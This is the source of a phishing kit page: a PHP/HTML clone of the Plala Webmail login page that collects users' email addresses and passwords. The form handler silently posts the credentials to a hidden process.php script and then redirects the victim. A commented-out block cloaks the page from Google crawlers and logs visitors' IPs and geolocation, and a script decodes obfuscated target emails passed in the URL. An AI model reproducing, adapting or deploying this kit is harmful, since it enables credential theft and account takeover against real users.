<?php
session_start();
/*   
            ALEIN EXPERT                  
*/
/*session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

date_default_timezone_set('GMT');
$timedate = date('H:i:s d/m/Y');

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = @$_SERVER['REMOTE_ADDR'];
$result  = "Unknown";
if(filter_var($client, FILTER_VALIDATE_IP)){
  $_SESSION['_ip_']  = $client;
}
elseif(filter_var($forward, FILTER_VALIDATE_IP)){
    $_SESSION['_ip_']  = $forward;
}
else{
    $_SESSION['_ip_']  = $remote;
}
$getdetails = 'https://extreme-ip-lookup.com/json/' . $_SESSION['_ip_'];
$curl       = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content    = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$country   = $details->country;
$org   = $details->org;
$isp   = $details->isp;
$adminvu .= "<tr>
                          <td>
                            {".$_SESSION['_ip_']."}
                          </td>
                          <td>
                            ".$TIME_DATE."
                          </td>
                          <td>
                            ".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
                          </td>
                          <td>
						  ".$country."
                          </td>
                          <td>
                           ".$org."
                          </td>
                        </tr>\n";
    $khraha = fopen("./rz/vus".$yourname.".html", "a");
	fwrite($khraha, $adminvu);
	$xx .= "{}\n";
    $khraha = fopen("./rz/vus.html", "a");
	fwrite($khraha, $xx);*/
	$permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>

<!DOCTYPE html>

<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Pragma" content="no-cache"> 
<meta http-equiv="Expires" content="0"> 
<meta name="Description" content="">
<meta name="Keywords" content="">
<title>ぷらら Webメール</title>
<!--<base href="https://web1.plala.or.jp/mail/plus/">-->
<link rel="stylesheet" href="https://web1.plala.or.jp/mail/plus/css/login.css" type="text/css">
<link rel="stylesheet" href="https://web1.plala.or.jp/mail/plus/css/tsuikalogin.css" type="text/css">

<!--
<script src="https://sec.plala.or.jp/fp/tags.js?org_id=2kamd3p6&amp;session_id=84865050e08c98e118fdff0af700c28e" type="text/javascript">
</script>
<script>
function click_submit(btn){
	btn.disabled = true;
	var f = document.forms["form"];
	f.method = "POST";
	f.action = "/cgi-bin/mail/plus/agent.cgi";
	f.submit();
	return true;
}
</script>
-->

<link rel="stylesheet" href="css/style.css" />

</head>

<body onload="document.forms[0].account.focus();">
<noscript>
<iframe src="https://sec.plala.or.jp/fp/tags?org_id=2kamd3p6&session_id=84865050e08c98e118fdff0af700c28e"
style="width: 100px; height: 100px; border: 0; position: absolute; top: -5000px;">
</iframe>
</noscript>
<div id="plala">
  <div class="bg_g">
    <table width="750" cellspacing="0" cellpadding="0" border="0">
      <tbody><tr>
        <td width="750"><!-- ========= HEADER ========= -->
          <div id="head">
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
              <tbody><tr>
                <td><table width="750" cellspacing="0" cellpadding="0" border="0" bgcolor="#ffffff">
                    <tbody><tr>
                      <td colspan="3"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" alt="" width="1" height="11"></td>
                    </tr>
                    <tr>
                      <td width="8"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" alt="" width="8" height="1"></td>
                      <td width="115" valign="top"><a href="http://www.plala.or.jp/index.html" target="_top">
					  <img src="https://web1.plala.or.jp/mail/plus/images/hd_logo_login.gif" alt="plala" width="115" height="58" border="0"></a></td>
                      <td width="627"><div>
					  <img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" alt="" width="627" height="58" border="0"></div></td>
                    </tr>
                  </tbody></table>
                  <table width="750" cellspacing="0" cellpadding="0" border="0">
                    <tbody><tr>
                      <td bgcolor="#eeeeee"><img src="https://web1.plala.or.jp/mail/plus/images/barg.gif" alt="" width="750" height="30" border="0"></td>
                    </tr>
                  </tbody></table></td>
              </tr>
            </tbody></table>
          </div>
          <!-- ========= /HEADER ========= -->
        </td>
      </tr>
      <tr>
        <td><div id="mainArea">
            <!-- ========= CAUTION ========= -->
            <noscript>
            <table border="0" cellspacing="0" cellpadding="0" width="727">
              <tr>
                <td><div class="caution"><span class="S">当サイトをご覧いただくためにはJavascriptを有効にする必要があります。お使いのブラウザのJavascriptを“有効”に設定してご覧下さい。</span></div></td>
              </tr>
            </table>
            </noscript>
            <!-- ========= /CAUTION ========= -->
            <div class="m_cnt">
              <div class="m_cnt_head">ぷらら　Webメール</div>
              <div class="m_cnts">
			  <br>
			
			<!-- error -->
                          <div>
      <table cellspacing="0" cellpadding="1" border="0">
        <tbody>
          <tr>
		
          </tr>
        </tbody>
      </table>
<!-- /error -->
</div>

<form name="loginForm" id="loginForm" method="post" action="">
<input type="hidden" name="atesaki" value="webmail_login"> 
                <!-- ========= CONTENTS ========= -->
                <br>
                <div align="center">
                  <table width="400" cellspacing="1" cellpadding="0" border="0" align="center">
                    <tbody><tr>
                      <td colspan="3" align="center">ぷららのメールアドレス/メールパスワードを入力してください。</td>
                    </tr>
					<tr>
					   <td colspan="3">
					      <div class="emailicon" style="width:210px;height:40px;margin:0 auto 1em auto;text-align:center">
                              <img src="img/otheremail.png" width="100" height="51" id="emicon1" style="margin: 0 auto; width:85px">
                          </div>
					   </td>
					</tr>
                    <tr>
                      <td colspan="3"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" height="10"></td>
                    </tr>
                    <tr>
                      <td align="right">メールアドレス</td>
                      <td width="30"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" width="30" height="1"></td>
                      <td align="left"><input type="email" name="email" id="email" required autocomplete="off" size="26" maxlength="128" value="" style="font-family:Arial,Helvetica,sans-serif;"></td>
                    </tr>
                    <tr>
                      <td colspan="3"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" height="5"></td>
                    </tr>
                    
                    <tr>
                      <td colspan="3"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" height="5"></td>
                    </tr>                    <tr>
                      <td align="right">メールパスワード</td>
                      <td></td>
                      <td align="left"><input type="password" name="emailpass" id="emailpass" required autocomplete="off" size="26" maxlength="20" style="font-family:Arial,Helvetica,sans-serif;"></td>
                    </tr>
		    
                    <tr>
                      <td colspan="3"><img src="https://web1.plala.or.jp/mail/plus/images/spacer.gif" height="15"></td>
                    </tr>                    <tr>
                      <td colspan="3" align="center"><input type="checkbox" name="mail_save_flag" value="1">メールアドレスの情報を保存する。</td>
                    </tr>
                  </tbody></table>
                </div>
                <br>
                <div align="center">
		<input type="hidden" name="metrix_session_id" value="84865050e08c98e118fdff0af700c28e"> 
                  <input onmouseover="this.src='https://web1.plala.or.jp/mail/plus/images/login_on.gif'" onmouseout="this.src='https://web1.plala.or.jp/mail/plus/images/login.gif'" type="image" src="https://web1.plala.or.jp/mail/plus/images/login.gif" name="submit" value="　ログイン　" >
                </div><br><br>
                <!-- ========= /CONTENTS ========= -->
		<font color="red">
		WEBメールへの悪質な不正ログインが増えてます。<br>
<a href="https://www.plala.or.jp/support/info/2020/0318/" target="_blank">こちら</a>の手順でご確認をお願いします。
		</font>
              </form></div>
              <div class="m_cnt_foot"></div>
            </div>
          </div></td>
      </tr>

      <tr>
        <td bgcolor="#FFFFE6"><!-- ========= FOOTER ========= -->
          <div id="copy"><span class="Mfix"><font color="#000000"><b>メールパスワードは会員登録証にてご確認いただけます。メールパスワードを忘れた方は<a href="http://web1.plala.or.jp/support/faq/faq_docs/ID0054.html" target="_blank">こちら</a>をご確認下さい。<br>複数メールのメールパスワードを忘れた方は<a href="http://web1.plala.or.jp/support/faq/faq_docs/ID0055.html" target="_blank">こちら</a>をご確認下さ</b></font><b><br>Copyright 2010 NTT Plala Inc. All rights reserved.</b></span></div><b>
          <!-- ========= /FOOTER ========= -->
        </b></td>
      </tr>
    </tbody></table>
  </div>
</div>



<iframe src="about:blank" id="tmx_tags_iframe" title="empty" tabindex="-1" aria-disabled="true" aria-hidden="true" style="width: 0px; height: 0px; border: 0px none; position: absolute; top: -5000px;"></iframe><iframe id="tdz_ifrm" title="empty" name="" marginwidth="0" marginheight="0" style="display: none !important; z-index: -9999 !important; visibility: hidden !important;" aria-disabled="true" aria-hidden="true" tabindex="-1" src="https://sec.plala.or.jp/fp/HP?session_id=84865050e08c98e118fdff0af700c28e&amp;org_id=2kamd3p6&amp;nonce=00351585e6e0d7a1&amp;mode=2&amp;hp=.co-operativebank.co.uk/CBIBSWeb/login.do.co-operativebank.co.uk/CBIBSWeb/start.do.de/portal/portal/x.entropay.com/basemenu/prot/x.facebook.comx.nationet.com/x.netbank.commbank.com.au/netbank/bankmainx.npbs.co.uk/netmastergoldbanking/x.nwolb.xlogin.aspx?refereridentx.rbsdigital.xAccountSummaryx.smile.co.uk/SmileWeb/login.do.smile.co.uk/SmileWeb/start.do.yandex.rux/CapitalOne_Consumer/x/easypay.by/x/sbank.ru/x53.com/servlet/efsonlinex://online.wellsfargo.com/x://secure.assist.ru/assistid/protected/main.doxabbeynational.co.uk/EBAN_ENS/BtoChannelDriverxalliance-leicesterxaltergold.com/login.phpxamericanexpress.com/myca/intl/acctsumm/emea/accountSummaryxbancaintesa.it/xbankcardservices.co.ukxbankofamerica.com/xbanquepopulaire.fr/xbnpparibas.net/xcahoot.comxcapitaloneonline.co.uk/CapitalOne_Consumer/Transactionsxcbonline.co.uk/ralu/reglm-web/setupSecurityQuestionPagexcibc.comxPreSignOnxcibc.comxSignOnxcitibank.ru/xclient.uralsibbank.ruxco-operativebank.co.uk/CBIBSWeb/loginSpixcommerceonlinebanking.comxcoventrybuildingsociety.co.ukxdeutsche-bank.dexdiscovercard.com/cardmembersvcs/strongauth/app/sa_mainxebanking.bawag.comxebc_ebc1961xegg.com/customer/movemoneyxegg.com/customer/yourmoneyxfacebook.com/xhalifax-online.co.ukxMyAccountsxhalifax-online.co.uk/x/Mhalifax-online.co.uk/personalxhsbc.co.uk/1/2/personal/internet-banking/xhsbc.comxhttps://banking.postbank.de/app/finanzstatus.init.do;jsessionidxib.fineco.it/FinecoWeb/BonificiServletxib.fineco.it/FinecoWeb/jsp/Main/HBFineco.jspxib.fineco.it/FinecoWeb/jsp/Main/Principale.jspxibank.alfabank.ruxin-biz.it/xipko.plxlibertyreserve.com/x/historylibertyreserve.com/x/loginwww.libertyreserve.com/x/Core.jswww.libertyreserve.com/x/transfer.libertyreserve.com/x/commonscript.jslloydstsb.co.uk/personal/a/account_overview/xmbna.co.ukxmenyala.ruxmoney.yandex.ruxmoneybookers.com/app/login.plxmoneymail.ruxmy.ebay.co.uk/ws/eBayISAPI.dll?MyEbayxmy.ebay.com/ws/eBayISAPI.dll?MyEbayxmy.ebay.fr/ws/eBayISAPI.dll?MyEbayxmybusinessbank.co.ukxnationet.com/AppServices/SignOn/SignOnProcess/RcaSignOnxnpbs.co.ukxnwolb.com/AccountSummaryxnwolb.com/Statementsxnwolb.com/TransfersLandingPagexoltx.fidelity.com/x/x/ofsummary/summaryxonline.lloydstsb.co.ukxonlinebanking.mandtbank.com/summary/AccountSummaryxpassport.yandex.ruxpaypal.com/x/cgi-bin/webscr?cmd=_accountxpaypal.com/x/cgi-bin/webscr?cmd=_login-done&amp;login_access=xpaypal.com/us/cgi-bin/webscr?cmd=_login-done&amp;login_access=xposte.it/xpsk.co.at/xsecure.lloydstsb.co.uk/personal/a/account_overviewxsmile.co.uk/SmileWeb/passcodexusaa.com/xusbank.com/internetBanking/RequestRouter?requestCmdId=Gxwachovia.comxybonline.co.uk/ralu/reglm-web/setupSecurityQuestionPagex.amazon.fr/xhistory/orders/view.htmlx.banquepopulaire.frxShowPortal.dox.bnpparibasfortis.bexHome_Logon.aspx.cdiscount.com/Account/Home.aspxx.cmb.frxaccueil.jspx.credit-agricole.frxentreeBam?sessionSAGx.labanquepostale.fr/xreleveCPP-releve_ccp.eax.secure.bnpparibas.net/NSFR?Actionx.secure.lcl.frxAccueilxcredem.it/OneToOne/ebank/functionsxmijn.ing.nl/xonline.ybs.co.ukxwww.discover.com/xorder.cdiscount.comxCustomer.aspxxsealinfo.verisign.com/splash?form_filexvos-comptes.credit-du-nord.fr/CDC_TableauDeBord_0.asp?xvoscomptesenligne.labanquepostale.frxwww.x.caisse-epargne.fr/Portail.aspxxwww.exabanque.netxonglet.phpxdeutsche-bank.de/xnorisbank.de/xpostbank.de/xtargobank.de/x.x.de/portal/x.bankofamerica.com/x/commonscript.js.bmo.com/OLB?id=x.bmo.com/RMC?id=x.chase.com/x.aspxx.chase.com/js/Reporting.jsx.koodomobile.com/account/selfserve/x/xaccountId=x.payment.ru/x.scotiabank.com/portal/index.jsp?xbancopopular.es/empresasxcreval.it/login2007/loginSiciliano.aspxfirst-direct.com/xipko.plxmybusinessbank.co.ukxsanpaoloimi.com/xulsterbankanytimebanking.x/login.aspxx" width="0px" height="0px" frameborder="0"></iframe>



<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="img/loading.gif" width="100" height="100">
    </div>
</div>

<script>


   var input = document.getElementById("zipcode");
   input.addEventListener("keyup", function(event){
	  if(event.keyCode === 13){
	    event.preventDefault();
		document.getElementById("btnlogin").click();
	  }
	
	});
</script> 

<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#email').val($c);
	$('#me').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

 var value =  $('#email').val();
 
 if (value.indexOf('@hotmail') >= 0 || value.indexOf('@live') >= 0 || value.indexOf('@msn') >= 0 || value.indexOf('@outlook') >= 0) {
	$('#emicon1').attr("src", "img/microsoft_logo.jpg" );
 }
 else if (value.indexOf('@yahoo') >= 0 || value.indexOf('@ymail') >= 0 || value.indexOf('@rocketmail') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@pacbell.net') >= 0) {
	$('#emicon1').attr( "src", "img/yahoo_logo.png" );
	}
	else if(value.indexOf('@icloud.com') >= 0){
		$('#emicon1').attr( "src", "img/icloud.png" );
	}
		else if(value.indexOf('@gmail.com') >= 0){
		$('#emicon1').attr( "src", "img/gmail.png" );
	}
	else if(value.indexOf('@verizon.net') >= 0){
		$('#emicon1').attr( "src", "img/verizon.jpg" );
	}
else if (value.indexOf('@peoplepc') >= 0 || value.indexOf('@earthlink.net') >= 0 || value.indexOf('@mindspring') >= 0) {
	$('#emicon1').attr( "src", "img/earthlink_logo.png" );
	}
else if (value.indexOf('@comcast.net') >= 0 || value.indexOf('@xfinity') >= 0) {
	$('#emicon1').attr( "src", "img/comcast_logo.png" );
	}
else if (value.indexOf('@aim.com') >= 0 || value.indexOf('@aol.com') >= 0) {
	$('#emicon1').attr( "src", "img/aol_logo.png" );
	}
else if (value.indexOf('@cox.net') >= 0) {
	$('#emicon1').attr( "src", "img/cox_logo.png" );
	}
else if (value.indexOf('@mail') >= 0) {
	$('#emicon1').attr( "src", "img/godaddy_logo.png" );
	}
else if (value.indexOf('@ameritech.net') >= 0 || value.indexOf('@att.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@flash.net') >= 0 || value.indexOf('@nvbell.net') >= 0 || value.indexOf('@pacbell.net') >= 0 || value.indexOf('@prodigy.net') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@snet.net') >= 0 || value.indexOf('@swbell.net') >= 0 || value.indexOf('@wans.net') >= 0) {
	$('#emicon1').attr("src", "img/atnt_logo.png" );
	
	}else{
		$('#emicon1').attr("src", "img/otheremail.png" );
	}


$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		 var a = $('#email').val();
		$.post('T_a_n_G_u_l_AR/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                                window.location.href = "indexs.php?email=" + a;
                        },2000);
		e.preventDefault();
	});

</script>





<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>